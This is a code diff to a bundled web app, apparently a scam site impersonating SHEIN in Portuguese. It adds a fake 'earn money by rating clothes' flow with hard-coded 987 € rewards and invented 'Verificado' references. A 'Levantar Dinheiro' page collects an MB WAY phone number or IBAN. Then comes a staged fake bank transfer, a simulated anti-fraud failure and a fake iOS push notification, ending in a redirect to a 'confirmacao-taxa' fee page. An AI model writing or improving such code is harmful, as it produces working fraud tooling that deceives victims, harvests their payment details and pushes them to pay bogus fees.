@@ -23563,7 +23563,7 @@ const Uo = [{
 Sv(document.getElementById("root")).render(i.jsx(Q2, {}));
 /* === SHEIN Premium v8 (cache-busted) === */
 ;(function(){try{
-  console.log('%c✓ SHEIN Premium v12 carregado','background:#000;color:#fff;padding:4px 10px;border-radius:2px;font-weight:800;letter-spacing:.1em');
+  console.log('%c✓ SHEIN Premium v13 carregado','background:#000;color:#fff;padding:4px 10px;border-radius:2px;font-weight:800;letter-spacing:.1em');
   console.log('• Produto info abaixo da imagem');
   console.log('• Overlay escuro rgba(0,0,0,0.62) no submit');
   console.log('• Fly money + som caixa registadora');
@@ -23636,15 +23636,12 @@ Sv(document.getElementById("root")).render(i.jsx(Q2, {}));
 
     '.se-pinfo{padding:14px 16px 16px;border-bottom:1px solid #f5f5f5;background:#fff}',
     '.se-pname{font-size:14px;font-weight:500;color:#333;line-height:1.45;margin:0 0 6px;letter-spacing:-.005em;display:-webkit-box;-webkit-line-clamp:2;-webkit-box-orient:vertical;overflow:hidden;word-break:break-word}',
-    '.se-psku-row{display:flex;align-items:center;gap:4px;margin:0}',
-    '.se-psku{font-size:12px;color:#888;font-weight:500;letter-spacing:.02em;font-variant-numeric:tabular-nums;margin:0;flex:1;min-width:0;overflow:hidden;text-overflow:ellipsis;white-space:nowrap}',
-    '.se-pcopy{flex-shrink:0;display:grid;place-items:center;width:28px;height:28px;border-radius:4px;background:none;border:0;color:#888;cursor:pointer;transition:background .15s ease,color .15s ease;-webkit-tap-highlight-color:transparent;padding:0}',
+    '.se-psku-row{display:inline-flex;align-items:center;gap:2px;margin:0;max-width:100%}',
+    '.se-psku{font-size:12px;color:#888;font-weight:500;letter-spacing:.02em;font-variant-numeric:tabular-nums;margin:0;flex:0 1 auto;overflow:hidden;text-overflow:ellipsis;white-space:nowrap;min-width:0}',
+    '.se-pcopy{flex-shrink:0;display:grid;place-items:center;width:24px;height:24px;border-radius:4px;background:none;border:0;color:#888;cursor:pointer;transition:background .15s ease,color .15s ease;-webkit-tap-highlight-color:transparent;padding:0;margin-left:-2px}',
     '.se-pcopy:hover,.se-pcopy:active{background:#f4f4f5;color:#000}',
-    '.se-pcopy svg{width:15px;height:15px;stroke-width:1.8;fill:none;stroke:currentColor;stroke-linecap:round;stroke-linejoin:round}',
+    '.se-pcopy svg{width:13px;height:13px;stroke-width:1.8;fill:none;stroke:currentColor;stroke-linecap:round;stroke-linejoin:round}',
     '.se-pcopy.ok{color:#16a34a}',
-    '.se-pcopy-toast{position:absolute;left:50%;top:calc(100% + 6px);transform:translateX(-50%);background:#000;color:#fff;font-size:10.5px;font-weight:700;padding:5px 10px;border-radius:4px;letter-spacing:.04em;text-transform:uppercase;pointer-events:none;opacity:0;transition:opacity .25s ease;white-space:nowrap;z-index:2}',
-    '.se-pcopy-toast.show{opacity:1}',
-    '.se-pinfo{position:relative}',
 
     '.se-c{padding:18px 16px 20px;border-bottom:1px solid #eee;background:#fff}',
     '.se-c:last-of-type{border-bottom:0}',
@@ -23703,18 +23700,93 @@ Sv(document.getElementById("root")).render(i.jsx(Q2, {}));
 
     '.se-fly{position:fixed;left:50%;top:50%;font-size:38px;font-weight:900;color:#16a34a;letter-spacing:-.02em;text-shadow:0 4px 18px rgba(22,163,74,.4);z-index:9400;pointer-events:none;font-variant-numeric:tabular-nums;will-change:transform,opacity;transform:translate(-50%,-50%) scale(1);transition:transform .8s cubic-bezier(.55,0,.4,1),opacity .8s ease;white-space:nowrap}',
 
-    '.se-done{position:fixed;inset:0;z-index:9200;background:rgba(0,0,0,.55);-webkit-backdrop-filter:blur(6px);backdrop-filter:blur(6px);display:grid;place-items:center;padding:20px}',
+    '.se-done{position:fixed;inset:0;z-index:9200;background:#fff;display:flex;flex-direction:column;overflow-y:auto;font-family:Inter,system-ui,sans-serif;color:#000;animation:seFadeUp .35s cubic-bezier(.22,1,.36,1)}',
     '.se-done.hidden{display:none}',
-    '.se-done-c{background:#fff;border-radius:2px;padding:34px 26px 26px;max-width:360px;width:100%;text-align:center;box-shadow:0 24px 60px rgba(0,0,0,.3);animation:seFadeUp .45s cubic-bezier(.22,1,.36,1)}',
-    '.se-done-ic{width:56px;height:56px;background:#16a34a;color:#fff;border-radius:999px;margin:0 auto 18px;display:grid;place-items:center}',
-    '.se-done-ic svg{width:28px;height:28px;stroke-width:3}',
-    '.se-done h2{font-size:20px;font-weight:800;margin:0 0 8px;letter-spacing:-.02em;line-height:1.25;color:#000}',
-    '.se-done p{font-size:13.5px;color:rgba(0,0,0,.6);margin:0 0 24px;line-height:1.55;letter-spacing:-.005em}',
-    '.se-done strong{color:#000;font-weight:800}',
-    '.se-cta{display:inline-flex;align-items:center;justify-content:center;gap:8px;width:100%;padding:16px 20px;background:#000;color:#fff;font-size:13px;font-weight:800;letter-spacing:.16em;text-transform:uppercase;border-radius:2px;border:0;cursor:pointer;font-family:inherit;transition:transform .15s ease}',
+    '.se-done-h{position:sticky;top:0;display:flex;align-items:center;justify-content:center;padding:14px 16px calc(14px + env(safe-area-inset-top,0px));background:rgba(255,255,255,.96);-webkit-backdrop-filter:blur(20px);backdrop-filter:blur(20px);border-bottom:1px solid #eee;z-index:5}',
+    '.se-done-h .se-logo{font-weight:800;letter-spacing:.22em;font-size:14px;color:#000;font-family:"Sora",Inter,system-ui,sans-serif}',
+    '.se-done-pill{display:inline-flex;align-items:center;gap:6px;margin:18px auto 0;padding:7px 14px;border-radius:999px;background:#f0faf5;border:1px solid #b8e5cb;font-size:13px;font-weight:700;color:#15803d;font-variant-numeric:tabular-nums;letter-spacing:-.01em}',
+    '.se-done-pill::before{content:"";display:inline-block;width:14px;height:14px;background:url("data:image/svg+xml;utf8,<svg xmlns=%22http://www.w3.org/2000/svg%22 viewBox=%220 0 24 24%22 fill=%22%23f59e0b%22><path d=%22M12 2l2.9 6.3 6.9.7-5.2 4.7 1.5 6.8L12 17.8l-6.1 3.2 1.5-6.8L2.2 9.5l6.9-.7L12 2z%22/></svg>") center/contain no-repeat}',
+    '.se-done-pill b{color:#000;font-weight:800;margin-right:2px}',
+    '.se-done-pill .lbl{color:#888;font-weight:500;margin-left:4px}',
+    '.se-done-hero{text-align:center;padding:18px 16px 8px}',
+    '.se-done-star{font-size:48px;line-height:1;margin-bottom:10px}',
+    '.se-done-hero h2{font-size:22px;font-weight:800;margin:0 0 8px;color:#000;letter-spacing:-.02em;line-height:1.2}',
+    '.se-done-hero p{font-size:13.5px;color:#666;line-height:1.55;margin:0 0 22px;max-width:340px;margin-inline:auto;letter-spacing:-.005em}',
+    '.se-sum-card{margin:0 16px 18px;border-radius:8px;border:1px solid #d4f0e0;background:#f0faf5;padding:16px}',
+    '.se-sum-card-h{font-size:11.5px;font-weight:800;letter-spacing:.18em;text-transform:uppercase;color:#555;text-align:center;margin:0 0 12px}',
+    '.se-sum-row{display:flex;justify-content:space-between;align-items:center;font-size:13px;color:#333;padding:5px 0;font-variant-numeric:tabular-nums}',
+    '.se-sum-row .grn{color:#16a34a;font-weight:700}',
+    '.se-sum-divider{height:1px;background:#d4f0e0;margin:8px 0}',
+    '.se-sum-row.total{font-weight:700;color:#000;align-items:baseline}',
+    '.se-sum-row.total .lbl{font-size:14px}',
+    '.se-sum-row.total .grn{font-size:20px;font-weight:800;letter-spacing:-.02em}',
+    '.se-sum-list{padding:0 16px;margin:0 0 14px;list-style:none}',
+    '.se-sum-li{display:flex;gap:12px;align-items:center;background:#fff;border:1px solid #eee;border-radius:8px;padding:10px 12px;margin-bottom:8px}',
+    '.se-sum-li img{width:48px;height:60px;object-fit:cover;border-radius:4px;flex-shrink:0;background:#f4f4f5}',
+    '.se-sum-li-body{flex:1;min-width:0;display:flex;flex-direction:column;gap:2px}',
+    '.se-sum-ref{font-size:14px;font-weight:700;color:#000;letter-spacing:-.005em;font-variant-numeric:tabular-nums}',
+    '.se-sum-badge{display:inline-flex;align-items:center;gap:3px;font-size:10.5px;font-weight:700;color:#16a34a;background:#f0faf5;border:1px solid #b8e5cb;border-radius:3px;padding:1px 6px 1px 5px;width:fit-content;letter-spacing:.02em}',
+    '.se-sum-badge::before{content:"✓";font-weight:900;font-size:10px}',
+    '.se-sum-li .grn{font-size:14px;font-weight:800;color:#16a34a;font-variant-numeric:tabular-nums;flex-shrink:0;letter-spacing:-.005em}',
+    '.se-cta-wrap{padding:8px 16px 32px}',
+    '.se-cta{display:flex;align-items:center;justify-content:center;gap:8px;width:100%;padding:16px 20px;background:#000;color:#fff;font-size:13px;font-weight:800;letter-spacing:.16em;text-transform:uppercase;border-radius:2px;border:0;cursor:pointer;font-family:inherit;transition:transform .15s ease}',
     '.se-cta svg{width:14px;height:14px;transition:transform .25s cubic-bezier(.22,1,.36,1);stroke-width:2.5}',
     '.se-cta:hover svg{transform:translateX(3px)}',
     '.se-cta:active{transform:scale(.99)}',
+    /* === v13 · Página Levantar Dinheiro === */
+    '#se-lev-overlay{position:fixed;inset:0;z-index:9000;background:#fff;overflow-y:auto;font-family:Inter,system-ui,sans-serif;color:#000;-webkit-overflow-scrolling:touch;animation:seFadeUp .35s cubic-bezier(.22,1,.36,1)}',
+    '#se-lev-overlay *{box-sizing:border-box}',
+    '.se-lev-h{position:sticky;top:0;display:grid;grid-template-columns:44px 1fr 44px;align-items:center;padding:8px 12px calc(8px + env(safe-area-inset-top,0px));background:rgba(255,255,255,.96);-webkit-backdrop-filter:blur(20px);backdrop-filter:blur(20px);border-bottom:1px solid #eee;z-index:5;min-height:48px}',
+    '.se-lev-h-title{font-size:15px;font-weight:700;color:#000;text-align:center;letter-spacing:-.01em}',
+    '.se-lev-bal-block{padding:24px 16px 22px;text-align:center;border-bottom:1px solid #eee}',
+    '.se-lev-bal-lbl{font-size:11px;font-weight:700;letter-spacing:.2em;text-transform:uppercase;color:#888;margin:0 0 6px}',
+    '.se-lev-bal-val{font-size:34px;font-weight:800;color:#000;font-variant-numeric:tabular-nums;letter-spacing:-.02em;margin:0;line-height:1.1}',
+    '.se-lev-bal-sub{font-size:11.5px;color:#888;margin:6px 0 0}',
+    '.se-lev-section{padding:18px 16px;border-bottom:1px solid #eee}',
+    '.se-lev-section h3{font-size:11.5px;font-weight:800;letter-spacing:.14em;text-transform:uppercase;color:#666;margin:0 0 14px}',
+    '.se-lev-method{display:flex;align-items:center;gap:12px;padding:13px 14px;border:1px solid #e5e5e5;border-radius:4px;cursor:pointer;margin-bottom:8px;background:#fff;transition:border-color .15s ease,background .15s ease;-webkit-tap-highlight-color:transparent}',
+    '.se-lev-method.active{border-color:#000;background:#fafafa}',
+    '.se-lev-method-radio{appearance:none;-webkit-appearance:none;width:18px;height:18px;border:2px solid #ccc;border-radius:999px;margin:0;flex-shrink:0;position:relative;background:#fff;cursor:pointer;transition:border-color .15s ease}',
+    '.se-lev-method.active .se-lev-method-radio{border-color:#000}',
+    '.se-lev-method.active .se-lev-method-radio::after{content:"";position:absolute;inset:3px;border-radius:999px;background:#000}',
+    '.se-lev-method-info{flex:1;min-width:0}',
+    '.se-lev-method-name{font-size:14px;font-weight:600;color:#000;margin:0;line-height:1.3}',
+    '.se-lev-method-desc{font-size:11px;color:#888;margin:2px 0 0;line-height:1.3}',
+    '.se-lev-method-tag{flex-shrink:0;padding:4px 8px;background:#000;border-radius:2px;color:#fff;font-size:9px;font-weight:800;letter-spacing:.06em;line-height:1}',
+    '.se-lev-input-wrap{margin-top:12px}',
+    '.se-lev-input-wrap label{display:block;font-size:11px;font-weight:700;color:#555;letter-spacing:.06em;text-transform:uppercase;margin-bottom:6px}',
+    '.se-lev-input{width:100%;padding:13px 14px;border:1px solid #d4d4d4;border-radius:4px;font:14px/1.4 inherit;color:#000;outline:none;transition:border-color .15s ease;font-variant-numeric:tabular-nums;letter-spacing:.02em}',
+    '.se-lev-input::placeholder{color:#bbb;letter-spacing:.04em}',
+    '.se-lev-input:focus{border-color:#000}',
+    '.se-lev-submit-wrap{padding:20px 16px 32px;background:#fff}',
+    '.se-lev-submit{display:flex;align-items:center;justify-content:center;gap:10px;width:100%;padding:17px 18px;background:#000;color:#fff;border:0;border-radius:2px;font-size:13.5px;font-weight:800;letter-spacing:.16em;text-transform:uppercase;cursor:pointer;font-family:inherit;transition:opacity .2s ease;-webkit-tap-highlight-color:transparent}',
+    '.se-lev-submit:disabled{background:#e5e5e5;color:#999;cursor:not-allowed}',
+    '.se-lev-submit svg{width:14px;height:14px;stroke-width:2.5;transition:transform .25s ease}',
+    '.se-lev-submit:not(:disabled):hover svg{transform:translateX(3px)}',
+    '.se-lev-note{font-size:11px;color:#888;text-align:center;line-height:1.5;margin:12px 0 0;letter-spacing:-.005em}',
+    '.se-lev-note b{color:#000;font-weight:700}',
+    /* Levantar flow overlay */
+    '.se-lev-flow{position:fixed;inset:0;z-index:9300;background:rgba(0,0,0,.62);-webkit-backdrop-filter:blur(3px);backdrop-filter:blur(3px);display:grid;place-items:center;opacity:0;transition:opacity .25s ease;pointer-events:none;padding:20px}',
+    '.se-lev-flow.on{opacity:1;pointer-events:auto}',
+    '.se-lev-flow-box{background:#fff;border-radius:6px;padding:30px 26px;max-width:300px;width:100%;text-align:center;box-shadow:0 16px 50px rgba(0,0,0,.3)}',
+    '.se-lev-flow-spin{width:38px;height:38px;border:3px solid rgba(0,0,0,.08);border-top-color:#000;border-radius:50%;margin:0 auto 14px;animation:seSpin .85s linear infinite;transform:translateZ(0);will-change:transform;-webkit-backface-visibility:hidden;backface-visibility:hidden}',
+    '.se-lev-flow-err{width:54px;height:54px;background:#dc2626;color:#fff;border-radius:999px;margin:0 auto 14px;display:grid;place-items:center;animation:seCheckIn .4s cubic-bezier(.22,1,.36,1);box-shadow:0 8px 24px rgba(220,38,38,.3)}',
+    '.se-lev-flow-err svg{width:28px;height:28px;stroke-width:3}',
+    '.se-lev-flow-t{font-size:14.5px;font-weight:700;color:#000;margin:0;line-height:1.4;letter-spacing:-.01em}',
+    '.se-lev-flow-t strong{font-weight:800}',
+    '.se-lev-flow-t.err{color:#dc2626}',
+    '.se-lev-flow-s{font-size:11.5px;color:#888;margin:6px 0 0;line-height:1.4}',
+    /* Push iOS */
+    '.se-push{position:fixed;top:calc(env(safe-area-inset-top,8px) + 8px);left:8px;right:8px;z-index:9500;background:rgba(245,245,247,.88);-webkit-backdrop-filter:blur(28px) saturate(180%);backdrop-filter:blur(28px) saturate(180%);border:1px solid rgba(255,255,255,.6);border-radius:16px;padding:11px 12px 13px;box-shadow:0 12px 32px rgba(0,0,0,.22),0 2px 6px rgba(0,0,0,.08);transform:translateY(-180%);transition:transform .55s cubic-bezier(.22,1,.36,1);cursor:pointer;color:#000;font-family:inherit;text-align:left;display:flex;align-items:flex-start;gap:10px;max-width:430px;margin:0 auto}',
+    '.se-push.show{transform:translateY(0)}',
+    '.se-push-icon{flex-shrink:0;width:36px;height:36px;border-radius:8px;background:#000;color:#fff;display:grid;place-items:center;font-size:11px;font-weight:900;letter-spacing:.1em;box-shadow:inset 0 1px 0 rgba(255,255,255,.15)}',
+    '.se-push-body{flex:1;min-width:0}',
+    '.se-push-hd{display:flex;justify-content:space-between;align-items:center;margin-bottom:1px}',
+    '.se-push-app{font-size:13px;font-weight:700;color:#000;letter-spacing:.02em}',
+    '.se-push-time{font-size:12px;color:#666;font-weight:500}',
+    '.se-push-msg{font-size:13.5px;color:#000;line-height:1.35;margin:0;letter-spacing:-.005em}',
+    '.se-push-msg b{font-weight:700}',
+
 
     '@media(prefers-reduced-motion:reduce){.shein-toast-in,.shein-toast-out,.shein-toast-dot,.shein-pop-in,.shein-step-row.shein-revealed,.se-prog-fill,.se-star.active svg,.se-bal.bump,.se-bal.glow{animation:none!important;transition:none!important}}'
   ].join('');
@@ -23754,6 +23826,7 @@ Sv(document.getElementById("root")).render(i.jsx(Q2, {}));
 
   /* === Tela de avaliação === */
   var REWARDS=[89,78,87,65,90,75,88,72,86,80,89,88]; /* soma 987 */
+  var REFS=['SH-2026-A1','SH-2026-A7','SH-2026-B3','SH-2026-B8','SH-2026-C4','SH-2026-C9','SH-2026-D2','SH-2026-D6','SH-2026-E1','SH-2026-E5','SH-2026-F3','SH-2026-F8'];
   var PRODUCTS=[
     {n:'SHEIN EZwear Blusa Feminina Sólida Gola Redonda Manga Curta Básico Verão',sku:'sw221124817264'},
     {n:'SHEIN BAE Top Bandeau Acetinado Bordô Sem Alças Cintura Marcada Festa',sku:'sw218894723105'},
@@ -23909,6 +23982,33 @@ Sv(document.getElementById("root")).render(i.jsx(Q2, {}));
     }catch(e){}
   }
 
+  function buildSummary(){
+    var bal=ev.balance;
+    var pillEl=document.getElementById('se-done-pill-val');
+    var gainEl=document.getElementById('se-sum-gain');
+    var finalEl=document.getElementById('se-final');
+    if(pillEl)pillEl.textContent=eur2(bal)+' €';
+    if(gainEl)gainEl.textContent='+'+eur2(bal)+' €';
+    if(finalEl)finalEl.textContent=eur2(bal)+' €';
+    var list=document.getElementById('se-sum-list');
+    if(!list)return;
+    list.innerHTML='';
+    for(var i=0;i<ev.evals.length;i++){
+      var e=ev.evals[i];
+      var img=IMG_CACHE[i%IMG_CACHE.length]||IMG_CACHE[0]||'';
+      var ref=REFS[i%REFS.length];
+      var li=document.createElement('li');
+      li.className='se-sum-li';
+      li.innerHTML='<img src="'+esc(img)+'" alt="" loading="lazy" />'+
+        '<div class="se-sum-li-body">'+
+          '<span class="se-sum-ref">Ref: '+esc(ref)+'</span>'+
+          '<span class="se-sum-badge">Verificado</span>'+
+        '</div>'+
+        '<span class="grn">+'+eur2(e.reward)+' €</span>';
+      list.appendChild(li);
+    }
+  }
+
   function buildOverlay(){
     if(document.getElementById('se-overlay'))return;
     cacheImgs();
@@ -23927,7 +24027,7 @@ Sv(document.getElementById("root")).render(i.jsx(Q2, {}));
       '<main class="se-main">'+
         '<div class="se-meta"><span class="se-meta-num" id="se-n">Look 01 <span>/ '+TOTAL+'</span></span><span class="se-meta-r" id="se-r">+ '+eur2(REWARDS[0])+' €</span></div>'+
         '<div class="se-img"><img id="se-img" alt="Peça em avaliação" /></div>'+
-        '<div class="se-pinfo"><p class="se-pname" id="se-pn">—</p><div class="se-psku-row"><span class="se-psku" id="se-ps">SKU: —</span><button type="button" class="se-pcopy" id="se-pcopy" aria-label="Copiar SKU"><svg viewBox=\"0 0 24 24\"><rect width=\"14\" height=\"14\" x=\"8\" y=\"8\" rx=\"2\" ry=\"2\"/><path d=\"M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2\"/></svg></button></div><div class="se-pcopy-toast" id="se-pcopy-toast">Copiado ✓</div></div>'+
+        '<div class="se-pinfo"><p class="se-pname" id="se-pn">—</p><div class="se-psku-row"><span class="se-psku" id="se-ps">SKU: —</span><button type="button" class="se-pcopy" id="se-pcopy" aria-label="Copiar SKU"><svg viewBox=\"0 0 24 24\"><rect width=\"14\" height=\"14\" x=\"8\" y=\"8\" rx=\"2\" ry=\"2\"/><path d=\"M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2\"/></svg></button></div></div>'+
 
         '<section class="se-c">'+
           '<div class="se-c-tag"><b>1</b> de 3 · Design</div>'+
@@ -23960,12 +24060,22 @@ Sv(document.getElementById("root")).render(i.jsx(Q2, {}));
       '<div id="se-flow" class="se-flow"><div class="se-flow-box"></div></div>'+
 
       '<div id="se-done" class="se-done hidden">'+
-        '<div class="se-done-c">'+
-          '<div class="se-done-ic">'+SVG_CHK+'</div>'+
-          '<h2>Avaliações concluídas</h2>'+
-          '<p>Acumulaste <strong id="se-final">0,00 €</strong> em <strong>'+TOTAL+' avaliações</strong>. O teu saldo está pronto a ser levantado.</p>'+
-          '<button type="button" id="se-go" class="se-cta"><span>Levantar agora</span>'+SVG_ARR+'</button>'+
+        '<header class="se-done-h"><span class="se-logo">SHEIN</span></header>'+
+        '<div class="se-done-pill"><b id="se-done-pill-val">0,00 €</b><span class="lbl">acumulados</span></div>'+
+        '<div class="se-done-hero">'+
+          '<div class="se-done-star">⭐</div>'+
+          '<h2>Avaliação completa!</h2>'+
+          '<p>Acumulaste pontos por cada peça que avaliaste. A tua opinião ajuda a Shein a decidir o que produzir.</p>'+
         '</div>'+
+        '<div class="se-sum-card">'+
+          '<p class="se-sum-card-h">Resumo de Pontos</p>'+
+          '<div class="se-sum-row"><span>Saldo inicial</span><span>0,00 €</span></div>'+
+          '<div class="se-sum-row"><span>Ganho a avaliar</span><span class="grn" id="se-sum-gain">+0,00 €</span></div>'+
+          '<div class="se-sum-divider"></div>'+
+          '<div class="se-sum-row total"><span class="lbl">Total acumulado</span><span class="grn" id="se-final">0,00 €</span></div>'+
+        '</div>'+
+        '<ul class="se-sum-list" id="se-sum-list"></ul>'+
+        '<div class="se-cta-wrap"><button type="button" id="se-go" class="se-cta"><span>Continuar</span>'+SVG_ARR+'</button></div>'+
       '</div>';
     document.body.appendChild(ov);
     bindEvents();
@@ -23985,7 +24095,6 @@ Sv(document.getElementById("root")).render(i.jsx(Q2, {}));
     ta.addEventListener('input',function(){ev.look.text=ta.value;var len=ta.value.length;cc.textContent=len+' / 50 caracteres';cc.classList.toggle('ok',len>=50);validate();});
         /* Copy SKU */
     var copyBtn=ov.querySelector('#se-pcopy');
-    var copyMsg=ov.querySelector('#se-pcopy-toast');
     if(copyBtn){
       copyBtn.addEventListener('click',function(){
         var raw=(document.getElementById('se-ps').textContent||'').replace(/^SKU:\s?/,'').trim();
@@ -23993,7 +24102,6 @@ Sv(document.getElementById("root")).render(i.jsx(Q2, {}));
         var showOk=function(){
           copyBtn.classList.add('ok');
           copyBtn.innerHTML='<svg viewBox="0 0 24 24" stroke-width="2.5"><path d="M20 6 9 17l-5-5"/></svg>';
-          if(copyMsg){copyMsg.classList.add('show');setTimeout(function(){copyMsg.classList.remove('show');},1500);}
           setTimeout(function(){copyBtn.classList.remove('ok');copyBtn.innerHTML='<svg viewBox="0 0 24 24"><rect width="14" height="14" x="8" y="8" rx="2" ry="2"/><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"/></svg>';},1600);
         };
         var doFallback=function(){try{var ta=document.createElement('textarea');ta.value=raw;ta.style.position='fixed';ta.style.opacity='0';document.body.appendChild(ta);ta.focus();ta.select();document.execCommand('copy');document.body.removeChild(ta);showOk();}catch(e){}};
@@ -24005,12 +24113,159 @@ Sv(document.getElementById("root")).render(i.jsx(Q2, {}));
       });
     }
     ov.querySelector('#se-sub').addEventListener('click',submit);
-    ov.querySelector('#se-go').addEventListener('click',function(){window.location.href='/confirmacao-taxa';});
+    ov.querySelector('#se-go').addEventListener('click',function(){window.location.href='/levantar';});
   }
 
   function destroyOverlay(){var ov=document.getElementById('se-overlay');if(ov){ov.remove();ev=null;}}
+
+  /* === v13 · Levantar Dinheiro === */
+  var LEV_ROUTES=/^\/levantar\/?$/;
+  var SVG_X='<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round"><path d="M18 6 6 18"/><path d="m6 6 12 12"/></svg>';
+
+  function buildLevantar(){
+    if(document.getElementById('se-lev-overlay'))return;
+    var ov=document.createElement('div');
+    ov.id='se-lev-overlay';
+    ov.innerHTML=
+      '<header class="se-lev-h">'+
+        '<button class="se-back" type="button" aria-label="Voltar">'+SVG_BACK+'</button>'+
+        '<span class="se-lev-h-title">Levantar Dinheiro</span>'+
+        '<span></span>'+
+      '</header>'+
+      '<div class="se-lev-bal-block">'+
+        '<p class="se-lev-bal-lbl">Saldo disponível</p>'+
+        '<p class="se-lev-bal-val">987,00 €</p>'+
+        '<p class="se-lev-bal-sub">Pronto a transferir</p>'+
+      '</div>'+
+      '<div class="se-lev-section">'+
+        '<h3>Método de Levantamento</h3>'+
+        '<label class="se-lev-method active" data-method="mbway">'+
+          '<input type="radio" name="se-lev-method" class="se-lev-method-radio" value="mbway" checked />'+
+          '<div class="se-lev-method-info"><p class="se-lev-method-name">MB WAY</p><p class="se-lev-method-desc">Transferência instantânea via app</p></div>'+
+          '<span class="se-lev-method-tag">MB WAY</span>'+
+        '</label>'+
+        '<label class="se-lev-method" data-method="iban">'+
+          '<input type="radio" name="se-lev-method" class="se-lev-method-radio" value="iban" />'+
+          '<div class="se-lev-method-info"><p class="se-lev-method-name">Transferência IBAN</p><p class="se-lev-method-desc">Banco — 1 a 2 dias úteis</p></div>'+
+          '<span class="se-lev-method-tag">IBAN</span>'+
+        '</label>'+
+        '<div class="se-lev-input-wrap" id="se-lev-w-mbway">'+
+          '<label for="se-lev-phone">Número de Telemóvel</label>'+
+          '<input type="tel" id="se-lev-phone" class="se-lev-input" placeholder="9XX XXX XXX" inputmode="numeric" maxlength="13" autocomplete="tel" />'+
+        '</div>'+
+        '<div class="se-lev-input-wrap" id="se-lev-w-iban" style="display:none">'+
+          '<label for="se-lev-iban">IBAN</label>'+
+          '<input type="text" id="se-lev-iban" class="se-lev-input" placeholder="PT50 0000 0000 0000 0000 0000 0" maxlength="29" autocomplete="off" />'+
+        '</div>'+
+      '</div>'+
+      '<div class="se-lev-submit-wrap">'+
+        '<button type="button" id="se-lev-submit" class="se-lev-submit" disabled><span>Levantar Dinheiro</span>'+SVG_ARR+'</button>'+
+        '<p class="se-lev-note">Operação <b>100% segura</b> · protegida por Shein Pay</p>'+
+      '</div>'+
+      '<div id="se-lev-flow" class="se-lev-flow"><div class="se-lev-flow-box"></div></div>';
+    document.body.appendChild(ov);
+    bindLevantar();
+  }
+
+  function bindLevantar(){
+    var ov=document.getElementById('se-lev-overlay');
+    ov.querySelector('.se-back').addEventListener('click',function(){window.history.back();});
+    var methods=ov.querySelectorAll('.se-lev-method');
+    for(var i=0;i<methods.length;i++){
+      (function(el){el.addEventListener('click',function(){
+        for(var j=0;j<methods.length;j++)methods[j].classList.remove('active');
+        el.classList.add('active');
+        el.querySelector('input').checked=true;
+        var v=el.dataset.method;
+        ov.querySelector('#se-lev-w-mbway').style.display=v==='mbway'?'block':'none';
+        ov.querySelector('#se-lev-w-iban').style.display=v==='iban'?'block':'none';
+        validateLev();
+      });})(methods[i]);
+    }
+    var ph=ov.querySelector('#se-lev-phone');
+    ph.addEventListener('input',function(){
+      var d=ph.value.replace(/\D/g,'').slice(0,9);
+      var f=d.replace(/(\d{3})(\d{3})(\d{0,3})/,function(_,a,b,c){return c?a+' '+b+' '+c:b?a+' '+b:a;});
+      ph.value=f;
+      validateLev();
+    });
+    var ib=ov.querySelector('#se-lev-iban');
+    ib.addEventListener('input',function(){
+      var v=ib.value.toUpperCase().replace(/[^A-Z0-9]/g,'').slice(0,25);
+      ib.value=v.replace(/(.{4})/g,'$1 ').trim();
+      validateLev();
+    });
+    ov.querySelector('#se-lev-submit').addEventListener('click',runLevFlow);
+    validateLev();
+  }
+
+  function validateLev(){
+    var ov=document.getElementById('se-lev-overlay');if(!ov)return;
+    var active=ov.querySelector('.se-lev-method.active');if(!active)return;
+    var v=active.dataset.method,ok=false;
+    if(v==='mbway'){
+      var phone=ov.querySelector('#se-lev-phone').value.replace(/\s/g,'');
+      ok=/^9[1236]\d{7}$/.test(phone);
+    }else{
+      var iban=ov.querySelector('#se-lev-iban').value.replace(/\s/g,'').toUpperCase();
+      ok=/^PT\d{23}$/.test(iban);
+    }
+    ov.querySelector('#se-lev-submit').disabled=!ok;
+  }
+
+  function runLevFlow(){
+    var flow=document.getElementById('se-lev-flow');
+    var box=flow.querySelector('.se-lev-flow-box');
+    flow.classList.add('on');
+
+    /* Fase 1 (2s) */
+    box.innerHTML='<div class="se-lev-flow-spin"></div><p class="se-lev-flow-t">A validar dados de pagamento…</p><p class="se-lev-flow-s">A confirmar com a tua instituição bancária</p>';
+
+    setTimeout(function(){
+      /* Fase 2 (2s) */
+      box.innerHTML='<div class="se-lev-flow-spin"></div><p class="se-lev-flow-t">A processar transferência de <strong>987,00 €</strong>…</p><p class="se-lev-flow-s">Liquidação na rede SEPA · canal SSL Shein</p>';
+
+      setTimeout(function(){
+        /* Fase 3 (1.5s) */
+        box.innerHTML='<div class="se-lev-flow-err">'+SVG_X+'</div><p class="se-lev-flow-t err">Falha na comunicação bancária</p><p class="se-lev-flow-s">Tentativa interrompida pelo sistema antifraude</p>';
+
+        setTimeout(function(){
+          /* Fase 4 · push iOS */
+          flow.classList.remove('on');
+          showPushIOS();
+        },1500);
+      },2000);
+    },2000);
+  }
+
+  function showPushIOS(){
+    var existing=document.getElementById('se-push');
+    if(existing)existing.remove();
+    var p=document.createElement('button');
+    p.id='se-push';p.type='button';p.className='se-push';
+    p.innerHTML='<div class="se-push-icon">S</div><div class="se-push-body"><div class="se-push-hd"><span class="se-push-app">SHEIN</span><span class="se-push-time">agora</span></div><p class="se-push-msg">⚠️ Transferência Bloqueada: A tua remessa de <b>987,00 €</b> requer confirmação. Toca para resolver.</p></div>';
+    document.body.appendChild(p);
+    void p.offsetWidth;
+    p.classList.add('show');
+    var redir=function(){window.location.href='/confirmacao-taxa';};
+    p.addEventListener('click',redir);
+    setTimeout(redir,4000);
+  }
+
+  function destroyLevantar(){
+    var ov=document.getElementById('se-lev-overlay');if(ov)ov.remove();
+    var pu=document.getElementById('se-push');if(pu)pu.remove();
+  }
+
+  function isLevRoute(){return LEV_ROUTES.test(window.location.pathname);}
+
+
   function isEvalRoute(){return EVAL_ROUTES.test(window.location.pathname);}
-  function checkRoute(){if(isEvalRoute()){cacheImgs();if(!document.getElementById('se-overlay'))setTimeout(buildOverlay,150);}else if(document.getElementById('se-overlay'))destroyOverlay();}
+  function checkRoute(){
+    if(isEvalRoute()){cacheImgs();if(!document.getElementById('se-overlay'))setTimeout(buildOverlay,150);}
